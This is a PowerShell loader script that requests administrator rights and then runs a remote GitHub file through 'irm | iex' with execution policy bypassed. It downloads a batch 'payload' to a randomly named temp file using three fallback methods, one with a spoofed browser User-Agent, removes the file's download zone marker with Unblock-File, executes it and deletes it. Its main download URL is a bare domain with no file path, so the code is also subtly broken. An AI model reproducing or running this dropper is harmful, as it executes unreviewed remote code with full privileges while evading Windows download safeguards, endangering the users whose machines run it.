$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# 1. Evaluate administrative execution token context
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
    try {
        # REMOTE DEPLOYMENT CONFIGURATION NOTE:
        # Update the placeholder string variable below to your target hosted repository address 
        # to ensure the sub-process shell can map and download the command payload accurately.
        $remoteScriptUrl = 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.txt' 
        
        $psArgs = @(
            "-NoExit",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command", "irm '$remoteScriptUrl' | iex"
        )
        Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -Verb RunAs
        Exit
    } catch {
        Write-Host "[-] Administrator elevation was declined or failed: $($_.Exception.Message)" -ForegroundColor Red
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        Exit
    }
}

# 2. Force modern TLS cryptographic protocols for GitHub transport paths
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13

# 3. Path variable mapping for target commit sequence download target
$rawUrl   = 'https://githubusercontent.com'
$tempDir  = [System.IO.Path]::GetTempPath()
$randTag  = [System.IO.Path]::GetRandomFileName().Substring(0, 6)
$tempBat  = Join-Path -Path $tempDir -ChildPath "run_${randTag}.bat"

$downloadSuccess = $false

Write-Host "[*] Connected as Administrator." -ForegroundColor Green
Write-Host "[*] Downloading batch payload from specific commit stream..." -ForegroundColor Cyan

# Tier 1: System curl subsystem execution route
if (Get-Command 'curl.exe' -ErrorAction SilentlyContinue) {
    try {
        & curl.exe -sL --fail "$rawUrl" -o "$tempBat" *>$null
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $tempBat) -and ((Get-Item -LiteralPath $tempBat).Length -gt 0)) {
            $downloadSuccess = $true
        }
    } catch {}
}

# Tier 2: System .NET WebClient assembly streaming pipeline
if (-not $downloadSuccess) {
    try {
        if (Test-Path -LiteralPath $tempBat) { Remove-Item -LiteralPath $tempBat -Force *>$null }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($rawUrl, $tempBat)
        $wc.Dispose()
        if ((Test-Path -LiteralPath $tempBat) -and ((Get-Item -LiteralPath $tempBat).Length -gt 0)) {
            $downloadSuccess = $true
        }
    } catch {}
}

# Tier 3: Native PowerShell Invoke-WebRequest baseline fallback
if (-not $downloadSuccess) {
    try {
        if (Test-Path -LiteralPath $tempBat) { Remove-Item -LiteralPath $tempBat -Force *>$null }
        Invoke-WebRequest -Uri $rawUrl -OutFile $tempBat -UseBasicParsing -TimeoutSec 15 *>$null
        if ((Test-Path -LiteralPath $tempBat) -and ((Get-Item -LiteralPath $tempBat).Length -gt 0)) {
            $downloadSuccess = $true
        }
    } catch {}
}

if (-not $downloadSuccess) {
    Write-Host "[-] Critical Error: Unable to fetch script components from target URL destination." -ForegroundColor Red
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    return
}

# 4. Remove system restriction properties and handle process initialization
try {
    # Remove zone indicator metadata from download stream
    Unblock-File -LiteralPath $tempBat -ErrorAction SilentlyContinue

    Write-Host "[+] Launching target workspace environment..." -ForegroundColor Green
    Start-Sleep -Seconds 1
    
    # Run targeted workspace shell engine context
    & "$env:ComSpec" /c "`"$tempBat`""
}
catch {
    Write-Host "[-] Execution engine error exception raised: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    Write-Host "`n--- Script Execution Lifecycle Complete ---" -ForegroundColor Cyan
    Write-Host "Press any key to purge temporary script caches and close this window." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
    # Secure storage cleanup step
    if (Test-Path -LiteralPath $tempBat) {
        Remove-Item -LiteralPath $tempBat -Force -ErrorAction SilentlyContinue
    }
}
